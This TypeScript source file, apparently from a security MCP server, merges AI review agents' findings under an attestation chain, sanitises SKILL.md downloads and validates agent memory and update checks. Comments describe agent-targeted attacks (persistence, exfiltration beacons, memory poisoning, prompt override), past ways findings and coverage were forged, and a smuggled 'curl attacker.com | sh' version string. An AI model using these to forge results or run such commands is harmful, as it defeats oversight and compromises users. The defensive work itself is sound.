    iso27001: z.array(z.string().max(128)).max(200).optional(),
    gdpr: z.array(z.string().max(128)).max(200).optional(),
    hipaa: z.array(z.string().max(128)).max(200).optional()
  }).optional(),
  beyondSkillMd: z.boolean().optional()
});

const AgentFindingsFileSchema = z.object({
  agentName: z.string().regex(SAFE_AGENT_NAME_RE).optional(),
  agentRunId: z.string().max(128).optional(),
  completedAt: z.string().max(64).optional(),
  internetUsed: z.boolean().optional(),
  memoryUpdated: z.boolean().optional(),
  skillMdSectionsCovered: z.array(z.string().max(64)).max(64).optional(),
  beyondSkillMd: z.array(z.string().max(500)).max(200).optional(),
  summary: z.string().max(4000).optional(),
  findings: z.array(AgentFindingSchema).max(5000),
  remediatedCount: z.number().optional(),
  openCount: z.number().optional(),
  // Both fields are covered by the attested payload hash, so they must survive
  // validation. Undeclared keys are stripped by zod, and the merge then recomputed the
  // hash over an object missing them: every executor-written file failed as
  // "payload-mismatch", its findings were discarded, and the run reported tampering that
  // had not happened. Declaring them keeps the hashed object and the validated object
  // the same object.
  capability: z.object({
    modelUsed: z.string().max(128).optional(),
    capabilityTierUsed: z.string().max(32).optional(),
    taskType: z.string().max(64).optional(),
    toolsAvailable: z.array(z.string().max(64)).max(64).optional(),
    toolsUsed: z.array(z.string().max(64)).max(64).optional()
  }).passthrough().optional(),
  naEvidence: z.object({
    isNotApplicable: z.boolean().optional(),
    signalsSearched: z.array(z.string().max(200)).max(50).optional(),
    rationale: z.string().max(2000).optional()
  }).passthrough().optional()
});

export const MergeAgentFindingsSchema = z.object({
  agentRunId: z.string().describe("Agent run ID."),
  runId: z.string().uuid().describe("Review run ID — used to update the review step record.")
});

export async function mergeAgentFindings(args: z.infer<typeof MergeAgentFindingsSchema>): Promise<MergedFindings> {
  const { agentRunId, runId } = args;
  const dir = agentRunDir(agentRunId);

  // Read all non-manifest JSON files in the agent-run directory
  let files: string[] = [];
  try {
    const entries = await readdir(dir);
    files = findingsCandidates(entries);
  } catch {
    files = [];
  }

  const allFindings: AgentFinding[] = [];
  const agentsCovered: AgentName[] = [];
  const agentsPartial: AgentName[] = [];
  const sectionsSeen = new Set<string>();
  const beyondSkillMdNotes: string[] = [];
  // Per-agent signal used by semantic validation (WEAK_AGENT_OUTPUT detection).
  const agentReportSignals = new Map<string, { findingCount: number; summary: string }>();

  // ── Inter-agent payload integrity (article surface #3) ───────────────────
  // Verify the attestation chain and index each agent's attested findings hash.
  // The chain is the source of truth for "did this agent really produce this
  // output". If the chain itself is tampered, no attestation can be trusted.
  const chainResult = await verifyChain(agentRunId);
  const chain = await getChain(agentRunId);
  const attestedHashByAgent = new Map<string, string>();
  const attestedPayloadByAgent = new Map<string, string | undefined>();
  // A second attestation for the same agent must not silently override the first. Attesting
  // a CRITICAL, then rewriting the file to an empty findings array and re-attesting, left
  // both links on disk and a valid chain, and the merge reported neither a rejection nor a
  // warning. Re-attestation is now recorded and treated as tampering.
  const reattested: string[] = [];
  for (const link of chain.links) {
    if (link.agentName && link.agentName !== "genesis") {
      if (attestedHashByAgent.has(link.agentName)) reattested.push(link.agentName);
      attestedHashByAgent.set(link.agentName, link.findingsHash);
      attestedPayloadByAgent.set(link.agentName, link.payloadHash);
    }
  }
  const chainHasAttestations = attestedHashByAgent.size > 0;
  const chainInvalid = chainHasAttestations && !chainResult.valid;
  const verificationMode: SignatureVerification["mode"] =
    chainInvalid ? "chain_invalid" : chainHasAttestations ? "enforced" : "unattested";
  const attestedAgents: string[] = [];
  const rejectedAgents: string[] = [];
  let tamperDetected = chainInvalid;

  // Read the manifest once (not per-file) for covered/partial classification.
  const manifest = await readManifest(agentRunId);

  for (const file of files) {
    let parsed: AgentFindingsFile;
    let rawFindings: AgentFinding[];
    let rawEnvelope: Record<string, unknown>;
    let agentName: string | undefined;
    try {
      const raw = await readFile(join(dir, file), "utf-8");
      const rawObj = JSON.parse(raw) as Record<string, unknown> & { findings?: AgentFinding[]; agentName?: string };
      rawEnvelope = rawObj;
      // CWE-20: strict schema validation BEFORE the payload is trusted downstream.
      parsed = AgentFindingsFileSchema.parse(rawObj) as AgentFindingsFile;
      // Hash the raw (pre-zod) findings so the digest matches exactly what the
      // agent serialized when it called security.attest_agent.
      rawFindings = (rawObj.findings ?? []) as AgentFinding[];
      agentName = parsed.agentName;
    } catch {
      // Corrupted or schema-invalid file — skip, note partial.
      agentsPartial.push(file.replace(".json", "") as AgentName);
      continue;
    }

    // Reject anything we cannot cryptographically trust when attestations are in use.
    const label = agentName ?? file.replace(".json", "");
    if (verificationMode === "chain_invalid") {
      rejectedAgents.push(`${label} (chain-invalid)`);
      continue;
    }
    if (verificationMode === "enforced") {
      const expected = agentName ? attestedHashByAgent.get(agentName) : undefined;
      if (!expected) {
        rejectedAgents.push(`${label} (unattested)`);
        continue;
      }
      if (expected !== computeFindingsHash(rawFindings)) {
        rejectedAgents.push(`${label} (hash-mismatch)`);
        tamperDetected = true; // findings changed after the agent signed them
        continue;
      }
      // findingsHash covers findings[] only. Everything else the file asserts about the
      // agent's own work (section coverage, summary, capability, N/A evidence) sat outside
      // the signature, so a file could be rewritten after attestation to claim 100% coverage
      // and a clean summary with the chain still verifying. payloadHash closes that.
      const expectedPayload = agentName ? attestedPayloadByAgent.get(agentName) : undefined;
      if (expectedPayload !== undefined) {
        // Every hashed field is read from the raw envelope, for the same reason
        // `rawFindings` already is: the hash must cover exactly the bytes the agent
        // signed. Sourcing any of them from the zod output re-introduces the mismatch,
        // because validation is free to drop a key the schema does not know about.
        const actualPayload = computePayloadHash({
          agentName: parsed.agentName ?? "",
          findings: rawFindings,
          skillMdSectionsCovered: rawEnvelope["skillMdSectionsCovered"],
          summary: rawEnvelope["summary"],
          capability: rawEnvelope["capability"],
          naEvidence: rawEnvelope["naEvidence"]
        });
        if (expectedPayload !== actualPayload) {
          rejectedAgents.push(`${label} (payload-mismatch)`);
          tamperDetected = true;
          continue;
        }
      }
      if (agentName && reattested.includes(agentName)) {
        rejectedAgents.push(`${label} (re-attested)`);
        tamperDetected = true;
        continue;
      }
      if (agentName) attestedAgents.push(agentName);
    }

    allFindings.push(...parsed.findings);
    if (parsed.agentName) {
      const rec = manifest.agents[parsed.agentName as AgentName];
      if (rec?.status === "completed_partial") {
        agentsPartial.push(parsed.agentName as AgentName);
      } else {
        agentsCovered.push(parsed.agentName as AgentName);
      }
      agentReportSignals.set(parsed.agentName, {
        findingCount: parsed.findings.length,
        summary: (parsed.summary ?? "").toLowerCase()
      });
    }
    for (const s of (parsed.skillMdSectionsCovered ?? [])) sectionsSeen.add(s);
    for (const n of (parsed.beyondSkillMd ?? [])) beyondSkillMdNotes.push(n);
  }

  // Deduplicate by id — on collision keep the HIGHEST severity so a malicious or
  // mislabeled low-severity finding cannot shadow a real CRITICAL that shares its id.
  const severityOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
  const byId = new Map<string, AgentFinding>();
  for (const f of allFindings) {
    const prev = byId.get(f.id);
    if (!prev || (severityOrder[f.severity] ?? 3) < (severityOrder[prev.severity] ?? 3)) {
      byId.set(f.id, f);
    }
  }
  const deduped = Array.from(byId.values());

  // Sort: CRITICAL > HIGH > MEDIUM > LOW
  deduped.sort((a, b) => (severityOrder[a.severity] ?? 3) - (severityOrder[b.severity] ?? 3));

  const uncoveredSections = SKILL_MD_SECTIONS.filter((s) => !sectionsSeen.has(s));

  // Opt-in fail-closed enforcement. An UNSIGNED attestation chain is forgeable by
  // anyone who can write the run directory (the chain hashes are SHA-256 over public
  // data), so "enforced" mode only carries cryptographic weight when the chain is
  // HMAC-signed. Operators who depend on inter-agent integrity set this flag; when
  // set, the run must be signed + enforced + clean or the gate fails closed. Default
  // off preserves backward-compatible behavior for runs that never attested.
  const requireAttestation = ["1", "true", "yes"].includes(
    (process.env.SECURITY_REQUIRE_AGENT_ATTESTATION ?? "").toLowerCase()
  );
  const chainSigned = Boolean(process.env.SECURITY_AUDIT_HMAC_KEY || process.env.SECURITY_POLICY_HMAC_KEY);
  const attestationDeficient =
    requireAttestation &&
    (verificationMode !== "enforced" || !chainResult.valid || !chainSigned || rejectedAgents.length > 0);

  const warnings: string[] = [];
  if (verificationMode === "unattested") {
    warnings.push("No attestation chain present — agent findings were schema-validated but not cryptographically verified. Call security.init_chain + security.attest_agent per agent to enforce inter-agent payload integrity.");
  }
  if (chainInvalid) {
    warnings.push(`Attestation chain failed verification (${chainResult.broken?.reason ?? "unknown"}). All agent findings rejected; gate forced to FAIL.`);
  }
  // Honest reporting: surface verifyChain's unsigned-chain caveat even on the success
  // path so "enforced" is never silently equated with cryptographic guarantee.
  if (chainResult.warning) {
    warnings.push(chainResult.warning);
  }
  if (rejectedAgents.length > 0) {
    warnings.push(`${rejectedAgents.length} agent finding file(s) rejected before merge: ${rejectedAgents.join(", ")}.`);
  }
  if (attestationDeficient) {
    warnings.push("SECURITY_REQUIRE_AGENT_ATTESTATION is set but this run is not a signed + enforced + clean attestation — gate forced to FAIL.");
  }

  // ── Thoroughness enforcement (ensure agents actually did the work) ────────
  // These are hard-fail signals that force the gate to FAIL, independent of severity.
  let thoroughnessFailed = false;

  // (a) SKILL.md section coverage.
  //
  //     Scored from `sectionsSeen`, which is built above from files that survived schema
  //     validation, attestation, and the payload hash. It is deliberately NOT scored by
  //     calling verifySkillCoverage, which reads every findings-shaped file in the run
  //     directory: a single unattested JSON file naming 28 sections took an honest 4%
  //     run to a 100% PASS with zero agent work. Coverage must be a property of work
  //     that was accepted, not of files that are present.
  //     Scored against what this run's roster can reach, recorded on the manifest at
  //     creation. Scoring against every section the product defines counted sections
  //     that live only in personas the run never scheduled, which put the floor out of
  //     reach for any repository without a cloud, mobile, and AI surface all at once.
  const denominator = manifest.coverageDenominator?.length
    ? manifest.coverageDenominator
    : [...SKILL_MD_SECTIONS];
  const coveredSections = denominator.filter((s) => sectionsSeen.has(s));
  const coverage = {
    covered: coveredSections,
    uncovered: denominator.filter((s) => !sectionsSeen.has(s)),
    coveragePercent: Math.round((coveredSections.length / denominator.length) * 100)
  };
  const requiredCoverage = minCoveragePct();
  if (coverage.coveragePercent < requiredCoverage) {
    thoroughnessFailed = true;
    warnings.push(
      `Skill-section coverage ${coverage.coveragePercent}% is below the required ${requiredCoverage}% — ` +
      `${coverage.uncovered.length} section(s) uncovered: ${coverage.uncovered.join(", ")}. Gate forced to FAIL.`
    );
  }

  // (b) Ghost / missing agent detection. Every always-on Phase-1 lead present in the
  //     manifest must have reported a terminal completed/completed_partial status.
  //     Stack-conditional leads are required only when they exist in the manifest.
  const conditionalLeads: AgentName[] = ["ai-llm-redteam", "mobile-security-specialist"];
  const requiredLeads: AgentName[] = [
    ...ALWAYS_ON_PHASE1_LEADS.filter((n) => manifest.agents[n] !== undefined),
    ...conditionalLeads.filter((n) => manifest.agents[n] !== undefined)
  ];
  const missingLeads: string[] = [];
  for (const lead of requiredLeads) {
    const rec = manifest.agents[lead];
    const ok = rec && (rec.status === "completed" || rec.status === "completed_partial");
    if (!ok) missingLeads.push(`${lead} (${rec?.status ?? "absent"})`);
  }
  if (missingLeads.length > 0) {
    thoroughnessFailed = true;
    warnings.push(`Required Phase-1 lead(s) did not complete: ${missingLeads.join(", ")}. Gate forced to FAIL.`);
  }

  // (b2) COMPLETION GATE. A run with unexecuted agents is not a completed review, and
  //      must never be mergeable into a green gate. `completed_na` counts as executed
  //      because it carries recorded evidence of why the domain is absent; `pending`
  //      and `running` do not. This is the check that converts every historical run on
  //      disk (266 of 280 slots still pending) from silently mergeable into an honest
  //      failure.
  const nonTerminalAgents = Object.entries(manifest.agents)
    .filter(([, rec]) => rec.status === "pending" || rec.status === "running")
    .map(([name]) => name);
  if (nonTerminalAgents.length > 0) {
    thoroughnessFailed = true;
    warnings.push(
      `${nonTerminalAgents.length} of ${Object.keys(manifest.agents).length} agent(s) never reached a terminal ` +
      `status: ${nonTerminalAgents.slice(0, 10).join(", ")}${nonTerminalAgents.length > 10 ? ", …" : ""}. ` +
      `A run with unexecuted agents is not a completed review. Gate forced to FAIL.`
    );
  }

  // (c) Escalation-required agents (retries exhausted in updateAgentStatus).
  const escalatedAgents = Object.entries(manifest.agents)
    .filter(([, rec]) => rec.escalationRequired)
    .map(([name]) => name);
  if (escalatedAgents.length > 0) {
    thoroughnessFailed = true;
    warnings.push(`Agent(s) exhausted retries and require escalation: ${escalatedAgents.join(", ")}. Gate forced to FAIL.`);
  }

  // (d) Lightweight semantic validation.
  //     - A finding marked remediated/resolved must carry a non-empty remediation summary.
  //     - A "completed" high-risk lead reporting zero findings and no explicit
  //       "no issues found" note yields a WEAK_AGENT_OUTPUT warning (non-fatal).
  const NO_ISSUE_NOTE_RE = /\b(no (issues?|findings?|vulnerabilit\w+) (found|identified|detected)|clean|nothing to report)\b/;
  const weaklyRemediated = deduped.filter((f) => f.remediated && !(f.remediationSummary ?? "").trim());
  if (weaklyRemediated.length > 0) {
    warnings.push(
      `WEAK_AGENT_OUTPUT: ${weaklyRemediated.length} finding(s) marked remediated without a remediation summary: ` +
      `${weaklyRemediated.slice(0, 10).map((f) => f.id).join(", ")}.`
    );
  }
  for (const lead of HIGH_RISK_LEADS) {
    const rec = manifest.agents[lead];
    if (!rec || rec.status !== "completed") continue;
    const signal = agentReportSignals.get(lead);
    if (signal && signal.findingCount === 0 && !NO_ISSUE_NOTE_RE.test(signal.summary)) {
      warnings.push(
        `WEAK_AGENT_OUTPUT: high-risk lead "${lead}" reported completed with zero findings and no explicit ` +
        `"no issues found" note — verify it actually performed a thorough analysis.`
      );
    }
  }

  // (e) Max-capability floor enforcement (1.5.0). Turns the "all agents always
  //     operate at fullest capability" mandate into a hard, gate-blocking invariant:
  //     every spawned agent must have run at its required model tier, met its tool
  //     floor, produced evidence, and covered its SKILL.md. Any degraded agent adds
  //     HIGH/CRITICAL findings into the merged set (so they force FAIL through the
  //     existing severity path) and flips thoroughnessFailed. Enforcement never
  //     crashes the merge: on any internal error it degrades to a non-fatal warning.
  try {
    const capability = await enforceCapabilityFloor({ agentRunId });
    if (capability.findings.length > 0) {
      for (const f of capability.findings) {
        // Adapt gate Finding -> AgentFinding shape (add the mandatory remediated flag).
        deduped.push({
          id: f.id,
          title: f.title,
          severity: f.severity,
          ...(f.evidence ? { evidence: f.evidence } : {}),
          ...(f.files ? { files: f.files } : {}),
          remediated: false,
          requiredActions: f.requiredActions
        });
      }
    }
    if (!capability.passed) {
      thoroughnessFailed = true;
      warnings.push(
        `CAPABILITY_FLOOR_NOT_MET: agent(s) did not run at full capability: ` +
        `${capability.degradedAgents.join(", ")}. Gate forced to FAIL.`
      );
    }
  } catch (err) {
    warnings.push(`Capability-floor enforcement could not complete: ${sanitizeErrorMessage(err instanceof Error ? err.message : String(err))}.`);
  }

  const signatureVerification: SignatureVerification = {
    mode: verificationMode,
    chainValid: chainResult.valid,
    attestedAgents,
    rejectedAgents,
    ...(warnings.length > 0 ? { warning: warnings.join(" ") } : {})
  };

  const merged: MergedFindings = {
    agentRunId,
    runId,
    mergedAt: new Date().toISOString(),
    agentsCovered,
    agentsPartial,
    totalFindings: deduped.length,
    critical: deduped.filter((f) => f.severity === "CRITICAL").length,
    high: deduped.filter((f) => f.severity === "HIGH").length,
    medium: deduped.filter((f) => f.severity === "MEDIUM").length,
    low: deduped.filter((f) => f.severity === "LOW").length,
    skillMdSectionsCovered: Array.from(sectionsSeen),
    uncoveredSections,
    findings: deduped,
    signatureVerification
  };

  // Write merged-findings.json
  const mergedPath = join(dir, "merged-findings.json");
  await writeFile(mergedPath, JSON.stringify(merged, null, 2) + "\n", { encoding: "utf-8", mode: 0o600 });

  // Hook into existing attestation flow. A tampered attestation chain or a
  // findings-hash mismatch (tamperDetected) forces FAIL even with zero findings —
  // a manipulated run must never produce a green gate. Thoroughness failures
  // (insufficient coverage, ghost/missing leads, exhausted-retry escalation) also
  // force FAIL so a run can never pass green without the agents doing full work.
  const hasCritical = merged.critical > 0;
  const hasHigh = merged.high > 0;
  const gateStatus =
    tamperDetected || attestationDeficient || thoroughnessFailed || hasCritical || hasHigh
      ? "FAIL"
      : "PASS";
  await updateReviewStep(runId, "run_pr_gate", "completed", {
    source: "multi-agent-run",
    agentRunId,
    agentsCovered: agentsCovered.length,
    agentsPartial: agentsPartial.length,
    totalFindings: merged.totalFindings,
    critical: merged.critical,
    high: merged.high,
    medium: merged.medium,
    low: merged.low,
    uncoveredSkillMdSections: uncoveredSections,
    skillCoveragePercent: coverage.coveragePercent,
    missingLeads,
    escalatedAgents,
    // Read by security.attest_review, which refuses to sign a run with unexecuted agents.
    nonTerminalAgents,
    thoroughnessFailed,
    signatureVerification,
    // security.attest_review reads latestGate["status"]; this step only ever wrote
    // "gateStatus", so a multi-agent FAIL left "status" undefined. Attest then errored
    // with a misleading "no run_pr_gate result recorded" — and worse, if a standalone
    // security.run_pr_gate had already recorded status:"PASS", that PASS is what attest
    // saw and this FAIL was invisible. Write both; "gateStatus" is kept for back-compat.
    status: gateStatus,
    gateStatus
  });

  return merged;
}

// 4. ensure_skill
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// POC-7 fix: SKILL.md content sanitization
// ---------------------------------------------------------------------------

/**
 * Patterns that indicate a backdoor or persistence mechanism in SKILL.md content.
 * These are stripped (line removed) before the file is written to disk.
 *
 * Attack classes defended against:
 *   1. Self-re-installation: instructions telling the agent to call ensure_skill
 *      on every invocation so a malicious version survives reinstallation.
 *   2. Exfiltration beacons: instructions to POST/GET findings to external URLs.
 *   3. Memory poisoning: instructions to write arbitrary false-positives entries.
 *   4. System prompt override: attempts to redefine the agent's core instructions
 *      via embedded meta-prompt directives.
 */
const SKILL_BACKDOOR_PATTERNS = INJECTION_PATTERNS;

/**
 * Sanitizes downloaded SKILL.md content by removing lines that match known
 * backdoor / prompt-injection patterns. Throws if more than 10 % of lines are
 * stripped (indicates the skill file itself may be malicious).
 */
function sanitizeSkillContent(content: string, skillName: string): string {
  const lines = content.split("\n");
  const stripped: number[] = [];
  const clean = lines.filter((line, idx) => {
    const isMalicious = SKILL_BACKDOOR_PATTERNS.some((re) => re.test(line));
    if (isMalicious) stripped.push(idx + 1);
    return !isMalicious;
  });

  if (stripped.length > 0) {
    console.warn(
      `[ensureSkill] Stripped ${stripped.length} suspicious line(s) from "${skillName}" SKILL.md ` +
      `(lines: ${stripped.join(", ")}). Review the source file.`
    );
  }

  // If more than 10 % of lines were stripped, the file is likely malicious — refuse install.
  const strippedFraction = stripped.length / Math.max(lines.length, 1);
  if (strippedFraction > 0.10) {
    throw new Error(
      `SKILL.md for "${skillName}" was rejected: ${stripped.length}/${lines.length} lines ` +
      `matched backdoor patterns (>${Math.round(strippedFraction * 100)}% threshold). ` +
      `Do not install this skill.`
    );
  }

  return clean.join("\n");
}

/**
 * Read a bundled SKILL.md verbatim from the installed package (the trust root).
 * Returns null when the skill is not bundled.
 *
 * No sanitization is applied here: bundled skills ship inside the package the
 * consumer already trusts, and stripping lines (e.g. the orchestrator's legitimate
 * `orchestration.ensure_skill` references) would corrupt the agent persona. Content
 * sanitization is reserved for the untrusted network-download path in ensureSkill.
 * Callers (MCP skill:// resources, agent prompts, ensureSkill) rely on the full,
 * unaltered persona so every agent runs at full capability on every client.
 */
export function readBundledSkillBody(skillName: string): string | null {
  // CWE-22: validate skillName before using it in a file path
  if (!SAFE_SKILL_NAME_RE.test(skillName)) {
    throw new Error(`Invalid skill name "${skillName}"`);
  }
  const bundledPath = join(BUNDLED_SKILLS_DIR, skillName, "SKILL.md");
  if (!existsSync(bundledPath)) return null;
  return readFileSync(bundledPath, "utf-8");
}

/**
 * List every bundled agent/skill name (directories under the package `skills/` dir
 * that contain a SKILL.md). Used to expose the full agent catalog over MCP so any
 * host can discover and load the roster.
 */
export function listBundledSkills(): string[] {
  try {
    return readdirSync(BUNDLED_SKILLS_DIR)
      .filter(
        (name) =>
          SAFE_SKILL_NAME_RE.test(name) &&
          existsSync(join(BUNDLED_SKILLS_DIR, name, "SKILL.md"))
      )
      .sort();
  } catch {
    return [];
  }
}

export const EnsureSkillSchema = z.object({
  skillName: z.string().describe("Name of the skill to ensure is installed (e.g. 'threat-modeler')."),
  version: z.string().optional().describe("Required version; re-downloads if installed version differs.")
});

export async function ensureSkill(args: z.infer<typeof EnsureSkillSchema>): Promise<{
  downloaded: boolean;
  version: string;
  path?: string;
  content: string;
}> {
  const { skillName, version: requiredVersion } = args;

  // CWE-22: validate skillName before using it in a file path
  if (!SAFE_SKILL_NAME_RE.test(skillName)) {
    throw new Error(`Invalid skill name "${skillName}"`);
  }

  const skillPath = join(CLAUDE_SKILLS_DIR, skillName, "SKILL.md");
  const versions = readJson<Record<string, { version: string; installedAt: string; path: string }>>(
    SKILL_VERSIONS_PATH, {}
  );

  const installed = versions[skillName];
  const alreadyCurrent =
    installed &&
    existsSync(skillPath) &&
    (!requiredVersion || installed.version === requiredVersion);

  if (alreadyCurrent) {
    // Prefer the verbatim bundled persona; fall back to the on-disk copy.
    const body = readBundledSkillBody(skillName) ?? readFileSync(skillPath, "utf-8");
    return { downloaded: false, version: installed.version, path: skillPath, content: body };
  }

  // TRUST ROOT: prefer the skill bundled inside the installed package over the network.
  // No download, no manifest, no TOFU — the consumer already trusts the installed package.
  // The full body is always returned so any MCP host (Claude Code, Cursor, VS Code,
  // Windsurf, Codex) can adopt the persona directly. The ~/.claude/skills materialization
  // is Claude-Code ergonomics only, so it runs solely when that layout exists.
  const bundledBody = readBundledSkillBody(skillName);
  if (bundledBody !== null) {
    const bundledVersion = requiredVersion ?? "bundled";
    let writtenPath: string | undefined;
    if (existsSync(join(homedir(), ".claude"))) {
      mkdirSync(dirname(skillPath), { recursive: true, mode: 0o700 });
      const tmp = `${skillPath}.tmp.${process.pid}`;
      writeFileSync(tmp, bundledBody, { encoding: "utf-8", mode: 0o600 });
      renameSync(tmp, skillPath);
      versions[skillName] = { version: bundledVersion, installedAt: new Date().toISOString(), path: skillPath };
      mkdirSync(dirname(SKILL_VERSIONS_PATH), { recursive: true, mode: 0o700 });
      writeFileSync(SKILL_VERSIONS_PATH, JSON.stringify(versions, null, 2) + "\n", { encoding: "utf-8", mode: 0o600 });
      writtenPath = skillPath;
    }
    return { downloaded: false, version: bundledVersion, path: writtenPath, content: bundledBody };
  }

  // Fallback (skill not bundled): fetch from the manifest with mandatory integrity check.
  const manifestRaw = await httpsGet(SKILLS_MANIFEST_URL, MAX_MANIFEST_BYTES);
  if (!manifestRaw) {
    throw new Error(`Cannot fetch skills manifest — check internet connection or run with internet permitted.`);
  }

  interface SkillEntry { version: string; url: string; }
  const manifest = JSON.parse(manifestRaw) as { skills: Record<string, SkillEntry> };
  const entry = manifest.skills[skillName];
  if (!entry) {
    throw new Error(`Skill "${skillName}" not found in skills manifest.`);
  }

  // CWE-918: only allow downloads from the expected GitHub raw domain
  if (!entry.url.startsWith(ALLOWED_SKILL_URL_PREFIX)) {
    throw new Error(`Skill URL for "${skillName}" does not match allowed origin: ${entry.url}`);
  }

  // Fetch SKILL.md content
  const content = await httpsGet(entry.url, MAX_SKILL_BYTES);
  if (!content) {
    throw new Error(`Failed to download SKILL.md for "${skillName}" from ${entry.url}`);
  }

  // CWE-494: verify SHA-256 of downloaded skill content against manifest hash.
  // sha256 is MANDATORY — reject any manifest entry that omits it. An absent sha256
  // field is itself an attack vector (allows content substitution without detection).
  const actualHash = createHash("sha256").update(content, "utf-8").digest("hex");
  const expectedHash = (entry as { sha256?: string }).sha256;
  if (!expectedHash) {
    throw new Error(
      `Integrity check failed for skill "${skillName}": manifest entry has no sha256 field. ` +
      `All skill entries must include a sha256 hash. Refusing to install.`
    );
  }
  if (actualHash !== expectedHash) {
    throw new Error(
      `Integrity check failed for skill "${skillName}": expected ${expectedHash}, got ${actualHash}`
    );
  }

  // POC-7 fix: sanitize SKILL.md content before writing to disk.
  // Strip instruction patterns that would cause the agent to re-invoke ensure_skill
  // on every run (persistence backdoor) or exfiltrate data to external URLs.
  const sanitized = sanitizeSkillContent(content, skillName);

  // Write skill atomically (write to temp, then rename) to prevent partial-write corruption
  mkdirSync(dirname(skillPath), { recursive: true, mode: 0o700 });
  const tmpSkillPath = `${skillPath}.tmp.${process.pid}`;
  writeFileSync(tmpSkillPath, sanitized, { encoding: "utf-8", mode: 0o600 });
  renameSync(tmpSkillPath, skillPath);

  // Update version cache
  versions[skillName] = { version: entry.version, installedAt: new Date().toISOString(), path: skillPath };
  mkdirSync(dirname(SKILL_VERSIONS_PATH), { recursive: true, mode: 0o700 });
  writeFileSync(SKILL_VERSIONS_PATH, JSON.stringify(versions, null, 2) + "\n", { encoding: "utf-8", mode: 0o600 });

  return { downloaded: true, version: entry.version, path: skillPath, content: sanitized };
}

// 5. read_agent_memory
// ---------------------------------------------------------------------------

export const ReadAgentMemorySchema = z.object({
  agentName: z.string().describe("Agent name whose memory to read.")
});

export async function readAgentMemory(args: z.infer<typeof ReadAgentMemorySchema>): Promise<{
  patterns: unknown;
  falsePositives: unknown;
  remediations: unknown;
  intel: unknown;
  errors: unknown;
}> {
  // CWE-22: validate agentName before using it as a directory component
  if (!SAFE_AGENT_NAME_RE.test(args.agentName)) {
    throw new Error(`Invalid agent name "${args.agentName}"`);
  }
  const dir = join(MEMORY_DIR, args.agentName);
  const read = (file: string) => readJson(join(dir, file), null);
  return {
    patterns: read("patterns.json"),
    falsePositives: read("false-positives.json"),
    remediations: read("remediations.json"),
    intel: read("intel.json"),
    errors: read("errors.json")
  };
}

// 6. write_agent_memory
// ---------------------------------------------------------------------------

// CWE-20: typed schema for false-positive entries — prevents arbitrary suppression payloads
const FalsePositiveEntrySchema = z.object({
  findingId: z.string().min(1).max(128).regex(/^[A-Z0-9_-]+$/, "findingId must be UPPER_SNAKE_CASE"),
  reason: z.string().min(1).max(500),
  affectedFiles: z.array(z.string().max(256)).max(50).optional(),
  suppressUntil: z.string().datetime().optional(),
  addedBy: z.literal("agent").describe("Only agents may add false-positive entries; blocks attacker-injected 'addedBy' fields")
});

// CWE-400: cap on individual memory entries to prevent disk exhaustion
const MAX_MEMORY_ITEMS = 500;
const MAX_PATTERN_ITEM_LENGTH = 2048; // characters per pattern string item
const MAX_INTEL_BYTES = 65536; // 64 KB

export const WriteAgentMemorySchema = z.object({
  agentName: z.string().describe("Agent name whose memory to update."),
  data: z.object({
    patterns: z.array(z.string().max(MAX_PATTERN_ITEM_LENGTH)).max(MAX_MEMORY_ITEMS).optional(),
    falsePositives: z.array(FalsePositiveEntrySchema).max(MAX_MEMORY_ITEMS).optional(),
    remediations: z.array(z.string().max(MAX_PATTERN_ITEM_LENGTH)).max(MAX_MEMORY_ITEMS).optional(),
    intel: z.unknown().optional(),
    errors: z.array(z.string().max(MAX_PATTERN_ITEM_LENGTH)).max(MAX_MEMORY_ITEMS).optional()
  })
});

export async function writeAgentMemory(args: z.infer<typeof WriteAgentMemorySchema>): Promise<{ written: string[] }> {
  const { agentName, data } = args;
  // CWE-22: validate agentName before using it as a directory component
  if (!SAFE_AGENT_NAME_RE.test(agentName)) {
    throw new Error(`Invalid agent name "${agentName}"`);
  }
  const dir = join(MEMORY_DIR, agentName);
  mkdirSync(dir, { recursive: true, mode: 0o700 });

  const written: string[] = [];
  const append = (file: string, newItems: unknown[] | undefined, existing: unknown[]) => {
    if (!newItems?.length) return;
    // CWE-400: cap total entries to prevent disk exhaustion
    const merged = [...existing, ...newItems].slice(-MAX_MEMORY_ITEMS);
    const serialized = JSON.stringify(merged, null, 2) + "\n";
    if (Buffer.byteLength(serialized, "utf-8") > MAX_INTEL_BYTES) {
      throw new Error(`Memory file "${file}" would exceed 64 KB size cap after write — trim existing entries first.`);
    }
    const p = join(dir, file);
    writeFileSync(p, serialized, { encoding: "utf-8", mode: 0o600 });
    written.push(p);
  };

  append("patterns.json", data.patterns, readJson(join(dir, "patterns.json"), []));
  append("false-positives.json", data.falsePositives, readJson(join(dir, "false-positives.json"), []));
  append("remediations.json", data.remediations, readJson(join(dir, "remediations.json"), []));
  append("errors.json", data.errors, readJson(join(dir, "errors.json"), []));

  if (data.intel !== undefined) {
    const p = join(dir, "intel.json");
    // CWE-1321: filter prototype-pollution keys before spread to prevent __proto__ injection
    const PROTO_KEYS = new Set(["__proto__", "constructor", "prototype"]);
    const intelObj = (typeof data.intel === "object" && data.intel !== null)
      ? Object.fromEntries(
          Object.entries(data.intel as Record<string, unknown>).filter(([k]) => !PROTO_KEYS.has(k))
        )
      : {};
    const intelPayload = JSON.stringify({ ...intelObj, fetchedAt: new Date().toISOString() }, null, 2) + "\n";
    // CWE-400: reject intel blobs over 64 KB
    if (Buffer.byteLength(intelPayload, "utf-8") > MAX_INTEL_BYTES) {
      throw new Error(`Intel payload exceeds 64 KB size cap (${Buffer.byteLength(intelPayload, "utf-8")} bytes).`);
    }
    writeFileSync(p, intelPayload, { encoding: "utf-8", mode: 0o600 });
    written.push(p);
  }

  return { written };
}

// 7. check_updates
// ---------------------------------------------------------------------------

export const CheckUpdatesSchema = z.object({
  currentMcpVersion: z.string().describe("Currently installed security-mcp version (from package.json).")
});

/** Fetch and validate the latest security-mcp version from npm. Returns null on failure. */
async function fetchLatestMcpVersion(): Promise<string | null> {
  const npmRaw = await httpsGet(NPM_REGISTRY_URL, MAX_NPM_BYTES, 3000);
  if (!npmRaw) return null;
  try {
    const parsed = (JSON.parse(npmRaw) as { version?: string }).version ?? null;
    // CWE-20: reject malformed version strings — a MitM could return a crafted
    // version like "1.0.0 && curl attacker.com | sh" to inject shell commands.
    if (parsed && SEMVER_RE.test(parsed)) return parsed;
    if (parsed) console.warn(`[checkUpdates] Ignoring malformed version string from npm registry: ${JSON.stringify(parsed)}`);
  } catch { /* ignore parse error */ }
  return null;
}

